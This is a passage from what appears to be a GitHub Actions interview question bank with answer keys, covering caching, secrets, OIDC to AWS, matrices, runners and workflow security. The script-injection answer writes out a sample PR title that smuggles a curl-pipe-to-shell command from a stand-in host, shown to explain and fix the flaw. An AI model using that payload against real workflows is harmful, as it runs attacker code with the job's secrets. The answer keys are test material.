objective.explanation: restore-keys gives a partial match, so the older cache is restored. cache-hit is 'true' only when the primary key matches exactly, so here it is 'false' and the install step runs. Because the primary key missed, the post step saves a new cache under that key when the job succeeds.

objective.question: You add workflow_dispatch: to a workflow on a feature branch and push it. The 'Run workflow' button does not appear on the Actions tab. What is the most likely reason?
options: Manual runs are only available on self-hosted runners
You must also add the push trigger
The workflow file with the workflow_dispatch trigger must exist on the default branch
workflow_dispatch needs at least one input defined
objective.explanation: The manual run button only appears when the workflow, with its workflow_dispatch trigger, exists on the default branch. After that, you can choose which branch to run it on. Inputs are optional, and runner type and other triggers do not matter.

objective.question: A secret DEPLOY_KEY is stored in the repository's 'production' environment, not as a repository secret. The deploy job reads ${{ secrets.DEPLOY_KEY }}, but the value is empty. What is missing?
options: The workflow needs permissions: secrets: read
Environment secrets work only in reusable workflows
The secret must be referenced as ${{ env.DEPLOY_KEY }}
The job must set environment: production
objective.explanation: A job can read environment secrets only when it declares that environment. Declaring it also applies the environment's protection rules, such as required reviewers. There is no secrets permission scope, and the env context does not hold secrets by itself.

objective.question: The second step prints 'Building ' with no version. Why, and what is the fix?

code.code:
steps:
  - run: export APP_VERSION=1.4.$GITHUB_RUN_NUMBER
  - run: echo "Building $APP_VERSION"

options: Each run step starts a new shell, so exported variables are lost. Write echo "APP_VERSION=1.4.$GITHUB_RUN_NUMBER" >> "$GITHUB_ENV"
export only works with shell: sh, so add shell: sh to both steps
Variables need the ${{ }} syntax inside run. Use ${{ APP_VERSION }}
GITHUB_RUN_NUMBER is not set on Linux runners. Use github.run_id instead
objective.explanation: Each step runs in its own process, so an export does not reach the next step. Appending NAME=value to the $GITHUB_ENV file makes the variable available to all later steps in the job. GITHUB_RUN_NUMBER is set on every runner, and ${{ APP_VERSION }} is not a valid expression.

objective.question: A build step runs git describe --tags to create a version, and it fails on CI with 'fatal: No names found, cannot describe anything'. It works locally. What is the fix?
options: Set fetch-depth: 0 on actions/checkout so the full history and tags are fetched
Run the job on windows-latest, where git includes tags
Use actions/cache to cache the .git folder
Add permissions: contents: write
objective.explanation: By default, actions/checkout makes a shallow clone of one commit without the tag history, so git describe finds no tags. fetch-depth: 0 fetches all history and tags. Write permission and runner OS do not change what gets cloned, and caching .git is fragile and not needed.

subjective.question: Explain the hierarchy of workflow, job, step and runner in GitHub Actions. What runs in parallel by default, and how do you change that?
subjective.answer: A workflow is a YAML file in .github/workflows/ that is started by triggers under on:. It contains one or more jobs. Each job runs on its own runner, which is a fresh GitHub-hosted VM or a self-hosted machine chosen with runs-on. A job has steps that run in order on that same runner. Because they share the runner, steps share the filesystem and environment. A step either runs a shell command with run: or calls an action with uses:. Jobs run in parallel by default. To order them, use needs:, for example deploy needs: [build, test]. Because jobs do not share a filesystem, you pass data between them with artifacts or job outputs. The default job timeout on GitHub-hosted runners is 360 minutes, so I set timeout-minutes so that hung jobs fail fast.
keyPoints: Workflow → jobs → steps; files live in .github/workflows/
Each job gets its own runner; steps share it
Jobs run in parallel unless you link them with needs:
Pass data between jobs with artifacts or outputs
Set timeout-minutes instead of relying on the 360-minute default

subjective.question: Describe how you would build a PR pipeline that lints, tests and builds a Node app on two Node versions. Walk through the key YAML parts.
subjective.answer: I trigger on pull_request against main, and also on push to main so the base branch builds caches. I set top-level permissions: contents: read. I add a concurrency group keyed on github.ref with cancel-in-progress: true. For the jobs, a lint job runs once on a single Node version. A test job uses strategy.matrix.node: [22, 24]. Its steps are actions/checkout, then actions/setup-node with node-version: ${{ matrix.node }} and cache: 'npm', then npm ci and npm test. I leave fail-fast at its default of true so a failure stops the other jobs early. A build job uses needs: [lint, test], runs npm run build, and uploads dist/ with actions/upload-artifact. Every job gets timeout-minutes. Finally, in a ruleset I mark lint, both matrix test checks and build as required. This makes a broken test block the merge.
keyPoints: Trigger on pull_request, plus push to main so caches are warm
Matrix on node versions, with setup-node caching
needs: orders the build job after lint and test
Upload the build output as an artifact
Mark the checks as required in a ruleset or branch protection

subjective.question: How do you design a good cache key, and how would you prove that the cache makes the second run faster?
subjective.answer: A cache key should change only when the dependencies change. A typical key is ${{ runner.os }}-node-${{ matrix.node }}-${{ hashFiles('**/package-lock.json') }}. I add restore-keys with a shorter prefix, so a partial match still restores most of the packages. With setup-node or setup-python, the built-in cache option does this for you. I cache the package manager's download cache, such as ~/.npm, rather than build outputs. Caches are scoped by branch. A PR can restore caches from its own branch and from the base branch, so I also run CI on push to main. To prove the speed-up, I compare two runs. On the first run, the cache step logs a miss and saves an entry. On the second run, it logs a cache hit, and the install step's duration drops. I also keep the limits in mind: 10 GB per repository by default, and entries unused for 7 days are evicted.
keyPoints: Key on OS, runtime version and a hash of the lockfile
restore-keys allows partial matches
Caches are branch-scoped; the base branch's cache helps PRs
Evidence: cache hit in logs and a shorter install step
Know the 10 GB default and 7-day eviction

subjective.question: Explain how OIDC federation from GitHub Actions to AWS works and why it is better than storing access keys as secrets.
subjective.answer: With OIDC, the job requests a signed JSON Web Token (JWT) from GitHub's OIDC provider. This needs permissions: id-token: write. The token contains claims such as repository, ref and environment in the sub claim, plus the audience. In AWS, I create an IAM OIDC identity provider for token.actions.githubusercontent.com. I then create a role whose trust policy checks the audience and restricts sub. For example, I allow only repo:org/app:environment:production. aws-actions/configure-aws-credentials exchanges the token with AssumeRoleWithWebIdentity and gets short-lived credentials. The benefits are that no long-lived key is stored, rotated or at risk of leaking. The credentials expire automatically. Access is limited to a specific repository, branch or environment. The common mistakes are a trust policy that is too broad, such as a wildcard on the whole organisation, and forgetting id-token: write.
keyPoints: The job needs id-token: write to request a JWT
The cloud trusts GitHub's OIDC provider
The trust policy restricts the audience and sub claims
Returns short-lived credentials; no stored keys
Avoid wildcard trust conditions

subjective.question: What is GITHUB_TOKEN, and how do you apply least privilege to it?
subjective.answer: GITHUB_TOKEN is an installation token that GitHub creates automatically for each job. It is scoped to the repository and expires when the job ends. Workflows use it to call the GitHub API, for example to comment on PRs or create releases. Its default permissions depend on repository or organisation settings, which can be permissive or restricted. I do not rely on that default. I set permissions: contents: read at the workflow level. Then I grant extra scopes only to the jobs that need them, such as pull-requests: write for a commenting job or id-token: write for OIDC. When you specify any permission, every scope you do not list becomes none. On fork PRs, the token is read-only no matter what you set. Also, events created with GITHUB_TOKEN generally do not trigger new workflow runs. This prevents loops.
keyPoints: Created automatically per job and scoped to the repository
Set a minimal top-level permissions block
Grant extra scopes per job only where needed
Unlisted scopes become none
Read-only on fork PRs; does not trigger new runs, which prevents loops

subjective.question: Why are pull requests from forks treated differently, and what are the risks of pull_request_target?
subjective.answer: Anyone can open a fork PR, so its code is untrusted. Under the pull_request trigger, GitHub runs the fork's workflow code, but it provides no repository secrets and only a read-only GITHUB_TOKEN. A malicious PR therefore cannot steal credentials. Maintainers can also require approval before workflows run for outside contributors. pull_request_target runs the workflow from the base branch, with secrets and a write-capable token. It is meant for safe tasks such as labelling. It becomes dangerous when the workflow checks out the PR head and runs its code, for example npm install or test scripts. The attacker's code would then run with your secrets. This is sometimes called a 'pwn request'. My rule: never build or run fork code under pull_request_target. If you need secrets, split the work. Run untrusted CI under pull_request, and run privileged steps only after review.
keyPoints: Fork PRs get no secrets and a read-only token
pull_request_target uses base context with secrets and write access
Checking out and running PR head code there is dangerous
Use approval for outside contributors
Split untrusted and privileged work

subjective.question: What are GitHub environments, and how do they help with safe deployments?
subjective.answer: An environment, such as staging or production, is a named deployment target that a job references with environment:. It can hold its own secrets and variables. A job can read them only when it targets that environment. Environments also support protection rules. These include required reviewers who must approve before the job starts, a wait timer, and deployment branch or tag rules, for example only main can deploy to production. This gives a manual gate and an audit trail in the deployments view. With OIDC, the environment name appears in the sub claim. The cloud trust policy can therefore allow the production role only for jobs in the production environment. In practice, my PR pipeline only builds and tests. A separate deploy job on main targets staging and then production, with reviewers on production.
keyPoints: Environment-scoped secrets and variables
Required reviewers, wait timers and branch rules
Audit trail of deployments
The environment name in the OIDC sub claim tightens cloud trust
Keeps PR CI separate from gated deploys

subjective.question: Compare reusable workflows and composite actions. When would you choose each?
subjective.answer: A reusable workflow is a workflow file with on: workflow_call. It declares inputs, secrets and outputs. The caller uses it at job level, for example jobs.ci.uses: org/templates/.github/workflows/node-ci.yml@<sha>. It can contain several jobs, each with its own runs-on, environment, matrix and permissions. Secrets are passed explicitly or with secrets: inherit. A composite action lives in an action.yml with runs: using: composite. It bundles steps, and each run step must declare a shell. It runs as a single step inside the caller's job, on the caller's runner. I use a reusable workflow to standardise an entire pipeline across many repositories, such as lint, test, build and a deploy with an environment. I use a composite action to share a repeated sequence of steps, such as setting up the toolchain, restoring the cache and installing dependencies. The two combine well: reusable workflows often call composite actions.
keyPoints: Reusable workflow: workflow_call, used at job level, can contain multiple jobs
Composite action: action.yml, runs as steps inside the caller's job
Only reusable workflows can define runners, environments or a matrix per job
Composite run steps need shell:
Pin both to a SHA or a controlled ref

subjective.question: An interviewer asks: 'Our CI fails but people still merge broken code. How do you enforce quality gates?'
subjective.answer: A failing check by itself is only information. To block merges, I add a ruleset or branch protection on main. In it, I require a pull request before merging and require specific status checks to pass. I also turn on the setting that requires the branch to be up to date, so checks run against the latest base. With a matrix, every combination is a separate check name, such as test (22) and test (24). Those names change when the matrix changes. A common pattern is a final summary job with needs: on all the others and if: always(), which fails when any dependency failed or was cancelled. I make only that job required. I also apply the rules to administrators, require reviews, and protect the workflow files with CODEOWNERS. That way nobody can weaken the gate quietly in the same PR.
keyPoints: Use required status checks in a ruleset or branch protection
Matrix jobs create separate check names
A summary job with needs and if: always() acts as a single gate
Require an up-to-date branch and reviews; include admins
Protect workflow files with CODEOWNERS

subjective.question: Your CI pipeline is slow, sometimes hangs for hours, and wastes runner minutes. What would you change?
subjective.answer: First, I set timeout-minutes on every job. On GitHub-hosted runners the default is 360 minutes, so a hung test can burn six hours. Second, I add a concurrency group per PR with cancel-in-progress: true, so new pushes cancel stale runs. Third, I check the cache. The key should be based on the lockfile, and the logs should show hits. A dependency-only cache is usually best. Fourth, I keep fail-fast on for the matrix. I trim the matrix to the versions we actually support, and run the expensive combinations only on main. Fifth, I run lint and fast unit tests first, and make the heavier jobs depend on them with needs:. I also use path filters so that docs-only changes skip the build. Finally, I upload test reports as artifacts with a short retention-days, rather than the 90-day default. This saves storage and still lets the team debug failures.
keyPoints: Set timeout-minutes instead of the 360-minute default
Use concurrency with cancel-in-progress
Verify cache hits with a lockfile-based key
Use fail-fast, a trimmed matrix and staged jobs with needs
Path filters and a short retention-days for artifacts

subjective.question: A service repository calls a central reusable workflow. Inside it, secrets.NPM_TOKEN is empty and the publish step fails, although the secret exists in the caller repository. Explain why this happens and show two ways to fix it.

code.code:
jobs:
  ci:
    uses: acme/platform/.github/workflows/node-ci.yml@v2
    with:
      node-version: '22'

subjective.answer: A reusable workflow does not automatically receive the caller's secrets. Each secret must be passed in, so here the called workflow sees an empty value. There are two fixes. First, in the caller, add secrets: inherit under the job. This passes all the caller's secrets, which is simple but broad, and it works for callers in the same organisation or enterprise. Second, pass secrets explicitly. The called workflow declares them under on: workflow_call: secrets:, for example NPM_TOKEN with required: true. The caller then maps them with secrets: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}. I prefer explicit passing for shared platform workflows. The contract is clear, a missing secret fails early because it is marked required, and the called workflow only gets what it needs. I would also check that the ref is pinned, here @v2, and that inputs are typed in workflow_call.
keyPoints: Reusable workflows do not receive the caller's secrets unless they are passed
secrets: inherit passes everything; it works within the same org or enterprise
Explicit secrets are declared under workflow_call with required: true
The explicit contract follows least privilege and fails early

subjective.question: Review this step. What is the security problem, and how do you fix it?

code.code:
on: pull_request
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Checking PR: ${{ github.event.pull_request.title }}"

subjective.answer: This is script injection. The ${{ }} expression is replaced before the shell runs, so the PR title becomes part of the script text. An attacker can set a title like a"; curl evil.sh | sh; echo " and run any command on the runner. That command can read GITHUB_TOKEN and any secrets the job can access. Titles, branch names, issue bodies and commit messages are all untrusted input. The fix is to pass the value through an environment variable: env: TITLE: ${{ github.event.pull_request.title }}, then run: echo "Checking PR: $TITLE". The shell now treats it as data, not code. I would also keep the token's permissions minimal, for example contents: read. I would avoid such patterns completely in privileged triggers like pull_request_target, and add a linter such as actionlint or CodeQL for workflows to catch it in review.
keyPoints: Expressions are expanded before the shell runs, which allows injection
PR titles, branch names and bodies are untrusted input
Pass values through env and quote the shell variable
Limit the token's permissions and scan workflows with a linter

subjective.question: Your company wants self-hosted runners to reach private build caches and to save on minutes. Compare them with GitHub-hosted runners and explain the security precautions, especially for public repositories.
subjective.answer: GitHub-hosted runners are managed, fresh virtual machines for each job. They are patched for you and discarded after the job, so nothing leaks between runs, but they are billed per minute for private repositories. Self-hosted runners run on your own machines. They can reach internal networks, use custom hardware and keep warm caches. You are responsible for patching, scaling and cleanup. The main risk is that a self-hosted runner executes whatever code a workflow tells it to. GitHub advises against using self-hosted runners with public repositories, because a fork PR could run malicious code on your network. Precautions: make runners ephemeral, one job per runner, for example with Actions Runner Controller on Kubernetes. Use runner groups to restrict which repositories can use which runners. Give the runner host minimal network access and no standing cloud credentials, and use OIDC instead. Keep the runner software updated, and target runners precisely with labels.
keyPoints: Hosted runners are fresh, managed VMs; self-hosted runners give network access and control
Self-hosted runners execute untrusted code; avoid them on public repositories
Use ephemeral runners, for example Actions Runner Controller
Use runner groups, network isolation and OIDC instead of stored keys

subjective.question: Explain what this matrix produces and why include is used here. How would you generate a matrix dynamically from a previous job?

code.code:
strategy:
  matrix:
    python: ['3.12', '3.13']
    include:
      - python: '3.13'
        coverage: true
      - python: '3.14'
        experimental: true

subjective.answer: The base matrix creates two jobs, one for Python 3.12 and one for 3.13. The first include entry matches the existing 3.13 combination, so it adds a new variable, coverage: true, to that job only. That lets one leg upload coverage with if: matrix.coverage. The second include entry, 3.14, does not match any existing combination, so it adds a third job with experimental: true. That job could be paired with continue-on-error: ${{ matrix.experimental == true }}. The total is three jobs. For a dynamic matrix, an earlier job computes JSON, for example the list of changed packages in a monorepo. It writes the JSON to $GITHUB_OUTPUT and exposes it as a job output. The matrix job declares needs on that job and sets matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}. If the list can be empty, I guard the matrix job with an if condition, because an empty matrix makes the job fail.
keyPoints: The base matrix creates two jobs
An include entry that matches an existing combination adds variables to it
An include entry that matches nothing adds a new job, so there are three in total
For a dynamic matrix, write JSON to a job output and read it with fromJSON(needs.X.outputs...)

subjective.question: A workflow step fails only on CI, not locally, and the logs show too little detail. How do you debug it effectively in GitHub Actions?
subjective.answer: First, I re-run the failed job with 'Enable debug logging' turned on. I can also set a secret or variable named ACTIONS_STEP_DEBUG to true for step debug logs, and ACTIONS_RUNNER_DEBUG to true for runner diagnostic logs. These show expression evaluation, environment setup and action internals. Next, I check the runner image. Hosted images get updated regularly, so tool versions may differ from my laptop. I pin versions with setup actions, for example a Node version file or a specific Python version. I print diagnostics in a step, such as tool versions, env sorted, and the github context passed through toJSON into an environment variable, taking care not to echo secrets. Secrets are masked anyway. I check for differences like case-sensitive file systems, missing environment variables, a shallow checkout (the default fetch-depth is 1) and the working directory. If the job builds files, I upload logs or test reports as artifacts with if: failure(). Finally, I reproduce the problem in a matching container image.
keyPoints: Re-run with debug logging, or set ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG
Compare the runner image and pin tool versions
Print contexts and versions safely, for example with toJSON
Check shallow clone, case sensitivity and env; upload diagnostics on failure()

subjective.question: Review this nightly workflow. A teammate says it 'runs at random times and sometimes tests old code'. Identify the issues and how you would correct them.

code.code:
name: nightly
on:
  schedule:
    - cron: '0 2 * * *'
jobs:
  e2e:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: release-1.x
      - run: npm ci && npm run e2e

subjective.answer: Schedule cron times are in UTC, so 0 2 * * * is 07:30 IST, not 2 a.m. local time. If the team wanted 2 a.m. IST, the cron should be 30 20 * * *. Scheduled runs can also be delayed when GitHub-hosted runners are under high load, especially at the top of the hour, so I would pick an odd minute. A scheduled workflow always runs from the default branch's copy of the workflow file. Here, the checkout is hard-coded to release-1.x, so it tests that branch, not main. That is likely the 'old code' complaint. I would remove the ref, or use a matrix over the branches that really need nightly tests. Also, in public repositories, scheduled workflows are disabled automatically after 60 days without repository activity. I would add workflow_dispatch so it can be run by hand, set timeout-minutes, and set least-privilege permissions.
keyPoints: Cron uses UTC; 2 a.m. IST is 30 20 * * *
Scheduled runs use the workflow file on the default branch and may be delayed
The hard-coded ref: release-1.x tests the wrong code
Add workflow_dispatch and timeout-minutes; note auto-disable in inactive public repos

subjective.question: Case study: a fintech team runs a Python API on 3.12 and 3.13. They need: lint and tests on every PR across both versions, merges blocked when tests fail, deploys to AWS only from main with a human approval, no long-lived AWS keys, and least-privilege tokens. Design the workflow and repository settings.
subjective.answer: I would write two workflows. ci.yml runs on pull_request to main with a top-level permissions: contents: read. Its test job uses a matrix python: ['3.12', '3.13']. It runs checkout, setup-python with cache: 'pip', pip install, then ruff or flake8, pytest and a build. It uploads artifacts named with the matrix value. A concurrency group with cancel-in-progress stops duplicate runs. In a branch ruleset on main, I require pull requests and require the exact checks 'test (3.12)' and 'test (3.13)'. deploy.yml runs on push to main. The deploy job sets environment: production, which has required reviewers and is limited to the main branch. It has permissions id-token: write and contents: read, and uses configure-aws-credentials with role-to-assume. The IAM role trusts only aud sts.amazonaws.com and sub repo:org/api:environment:production. It has only the permissions the deploy needs. No AWS keys are stored in GitHub.
keyPoints: Matrix over two Python versions with pip caching
Required status checks with exact matrix job names in a ruleset
A protected production environment with reviewers, limited to main
OIDC role with a pinned sub claim and no stored keys
Read-only token by default; id-token: write only on the deploy job

subjective.question: Troubleshooting: your team added caching, but the second CI run is no faster than the first. List the likely causes and how you would check each one.
subjective.answer: First, I read the cache step log. It tells me whether the cache was restored, which key matched, or that nothing was found. If the key contains github.sha or a timestamp, it changes every run and never hits, so I key on the lockfile hash instead. Second, actions/cache saves in its post step only when the job succeeds. If the first run failed, nothing was saved. Third, cache scope: a PR branch can restore caches from its own branch and the base or default branch, but not from a sibling branch. So I make sure main has a warm cache. Fourth, caches that are unused for a while, or that exceed the repository size limit, are evicted. Fifth, the wrong path may be cached. For npm, setup-node caches the npm cache directory, and npm ci still runs. To prove the gain, I compare the duration of the install step across two runs with the same lockfile.
keyPoints: Read the restore and save lines in the cache step log
Use a stable key based on the lockfile hash, not github.sha
The cache is saved only if the job succeeds
Branch scope rules and eviction can cause misses
Measure the install step time across runs

subjective.question: Spot the mistakes in this PR workflow. It is meant to test on Node 22 and 24 and keep a coverage report from each version.

code.code:
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [22, 24]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: modules
      - run: npm install
      - run: npm test
      - uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage/

subjective.answer: There are five problems. First, node-version is hard-coded to 22, so both matrix legs test Node 22. It must be ${{ matrix.node }}. Second, the cache key 'modules' never changes, so the cache is never refreshed and goes stale. Third, caching node_modules directly is fragile across Node versions, and here both legs share it. I would delete the cache step and set cache: 'npm' on setup-node. That caches the npm cache directory, keyed on the package-lock.json hash. Fourth, npm install can change the lockfile and install versions nobody reviewed. npm ci installs exactly what the lockfile says and fails if it is out of sync. Fifth, both legs upload an artifact called 'coverage'. With upload-artifact v4 the second upload conflicts, so the name should be coverage-${{ matrix.node }}. I would also add permissions: contents: read at the top, and make 'test (22)' and 'test (24)' required checks.
keyPoints: The matrix value is not used in setup-node
Static cache key and caching node_modules
npm install instead of npm ci
Artifact name must be unique per matrix leg
Missing least-privilege permissions and required checks

subjective.question: List, in order, the steps to make a failing test actually block merges to main, and how you verify it.
subjective.answer: Step 1: make sure the CI workflow runs on pull_request for main, and let it run at least once. A check name can only be selected after it has reported. Step 2: in the repository settings, create a branch ruleset or branch protection rule that targets main. Step 3: turn on 'Require a pull request before merging', so nobody pushes directly. Step 4: turn on 'Require status checks to pass' and add the exact check names, such as 'test (22)' and 'test (24)' for a matrix. Another option is one summary job that needs all legs. Step 5: decide whether branches must be up to date before merging, and keep the bypass list small, so admins are not exempt without a reason. Step 6: verify. Open a PR with a deliberately broken test and confirm the Merge button is blocked. Then fix the test and confirm the merge is allowed once the checks go green.
keyPoints: The check must have run once before it can be selected
Use a ruleset or branch protection on main
Require a PR and the exact status check names
Limit who can bypass
Verify with a deliberately failing PR

subjective.question: A workflow uses on: [push, pull_request]. Developers see two identical CI runs for each push to a PR branch. Compare the two triggers and recommend a better setup.
subjective.answer: push fires for every commit pushed to any branch and tests the branch head. pull_request fires on PR activity. By default it checks out a test merge commit of the PR into the base branch, so it tests the result of merging, which is what we want before a merge. With both triggers and no filter, one commit to a PR branch starts two runs. That wastes minutes and gives duplicate checks. PRs from forks also start only pull_request runs in the base repository, because the push happens in the fork. My recommendation is pull_request with branches: [main] to validate PRs, and push with branches: [main] for post-merge work such as building release artifacts or deploying. I would add a concurrency group keyed on the workflow and ref, with cancel-in-progress for PRs, so superseded runs stop. The required checks then come from the pull_request run.
keyPoints: push tests the branch head; pull_request tests the merge result
Using both without filters doubles runs
Forks trigger only pull_request in the base repository
Filter push to main; use concurrency to cancel old runs

subjective.question: Troubleshooting: a deploy job fails with 'Not authorized to perform sts:AssumeRoleWithWebIdentity'. Walk through how you find the cause.
subjective.answer: I work from GitHub towards AWS. First, I check that the job has permissions: id-token: write. Without it there is no token at all, and the error is different. Next, I check the role ARN and that the IAM OIDC provider for token.actions.githubusercontent.com exists in that same account. Then I compare the token claims with the trust policy. aud must be sts.amazonaws.com, which is the default for configure-aws-credentials. The sub format depends on the run. A push uses repo:org/repo:ref:refs/heads/main. A tag uses ref:refs/tags/v1.2.0. A pull_request uses repo:org/repo:pull_request. A job with an environment uses repo:org/repo:environment:name. Most failures come from a trigger or an environment changing the sub value. CloudTrail records the failed AssumeRoleWithWebIdentity call, which helps. If needed, I decode only the token's claims in a debug job, never the full token. Finally, I fix the trust policy with StringEquals on the exact sub, not a wildcard.
keyPoints: Check id-token: write, the role ARN and the provider in the right account
aud must be sts.amazonaws.com
The sub format changes with branch, tag, PR or environment
Use CloudTrail and the decoded claims as evidence
Fix with an exact sub match, not a wildcard

subjective.question: Spot the design mistake in this composite action and show how to fix it.

code.code:
name: publish-package
runs:
  using: composite
  steps:
    - run: npm publish
      shell: bash
      env:
        NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

subjective.answer: A composite action cannot read the secrets context. Only workflows can, so this action fails when it loads instead of publishing. The fix is to declare an input, for example inputs: npm-token with required: true. The step then uses NODE_AUTH_TOKEN: ${{ inputs.npm-token }}. The caller passes the secret explicitly with with: npm-token: ${{ secrets.NPM_TOKEN }}. The value is still masked in logs because it comes from a secret. This design is also better: the action states what it needs, and each caller decides which secret to give it. If the publish logic grows into several jobs, or needs a protected environment, I would make it a reusable workflow instead. A reusable workflow can receive secrets with a secrets: block or secrets: inherit. The step keeps its shell: bash, which every run step in a composite action needs.
keyPoints: The secrets context is not available in composite actions
Pass secrets in as inputs from the calling workflow
Values from secrets stay masked
Choose a reusable workflow when you need jobs, environments or secrets: inherit

subjective.question: Which is better for a Node project: actions/setup-node with cache: 'npm', or a hand-written actions/cache step? Explain when you would use each.
subjective.answer: For dependencies, I prefer setup-node with cache: 'npm'. It is one line, and it builds the key from the OS and the lockfile hash. It caches the npm cache directory, not node_modules, so npm ci still installs cleanly and the cache stays correct across Node versions. It is hard to get wrong, which matters across many repositories. actions/cache is the right tool when I need control. Examples are extra caches such as a Next.js build cache or Playwright browsers, custom keys, restore-keys for partial matches, or the separate restore and save actions, for example to save a cache even when tests fail. A common setup uses both: setup-node for packages, and actions/cache for build-tool caches keyed on the lockfile and source hashes. I would not use actions/cache to duplicate what setup-node already caches, because that wastes storage.
keyPoints: setup-node caching is simple and keyed on the lockfile
It caches the package manager cache, not node_modules
actions/cache allows custom paths, keys, restore-keys and split restore/save
Use both together for different caches, without duplication

subjective.question: Your company stores AWS access keys as GitHub secrets in 40 repositories. Plan, in order, a safe migration to OIDC with no deploy downtime.
subjective.answer: 1. Inventory: find every workflow that uses AWS_ACCESS_KEY_ID, and map repositories to IAM users and the permissions they use. 2. In each AWS account, create the GitHub OIDC identity provider with audience sts.amazonaws.com. 3. Create one role per repository and environment. Use a trust policy with an exact sub, such as repo:org/app:environment:production, and a least-privilege permissions policy. Infrastructure-as-code such as Terraform makes this repeatable. 4. Update the workflows: add id-token: write to the deploy jobs, and switch configure-aws-credentials to role-to-assume. Roll this out one repository at a time, starting with non-production. 5. Verify in CloudTrail that deploys now use AssumeRoleWithWebIdentity. 6. Delete the key secrets from GitHub. Deactivate the IAM user keys first and watch for failures, then delete the keys and the users. 7. Add guardrails, such as alerts on new access keys and a standard workflow template, so keys do not come back.
keyPoints: Inventory current key usage first
Provider, then roles with exact sub claims and least privilege
Migrate workflows gradually, non-production first
Confirm in CloudTrail before removing anything
Deactivate, then delete the keys; add guardrails
